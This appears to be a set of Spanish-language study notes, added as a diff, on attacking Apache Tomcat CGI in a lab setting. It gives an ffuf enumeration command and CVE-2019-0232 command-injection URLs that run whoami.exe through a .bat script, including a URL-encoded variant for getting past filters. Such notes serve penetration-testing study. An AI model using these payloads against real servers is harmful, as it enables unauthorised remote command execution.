@@ -1,0 +1,20 @@
+	### Attacking Tomcat CGI
+Es un componente de Apache Tomcat que permite la comunicacion con aplicaciones externas fuera de Tomcat JVM. Estas aplicaciones son, en general, scripts escritos en: Per, Python o Bash.
+CGI recibe request de web browser y se lo hace procesar a estos scripts.
+Se interactua con estos script pasandole data en la url (ej. title=hola&autor=SrX)
+
+	## Enumerting
+ffuf -w /usr/share/dirb/wordlists/common.txt -u http://10.129.204.227:8080/cgi/FUZZ.cmd
+#Lista para fuzzear y buscar scripts CGI. Puede ser tanto CMD como BAT
+
+	## Attacking CGI
+CVE-2019-0232
+	Apache Tomcat 9.0.0.M1 to 9.0.17
+	Apache Tomcat 8.5.0 to 8.5.39
+	Apache Tomcat 7.0.0 to 7.0.93
+http://10.129.204.227:8080/cgi/welcome.bat?&c:\windows\system32\whoami.exe
+#Se utiliza CGI para correr comando en el sistema
+http://10.129.204.227:8080/cgi/welcome.bat?&c%3A%5Cwindows%5Csystem32%5Cwhoami.exe
+#Si existen filtros, puede url encodearse para no obtener errores
+
+
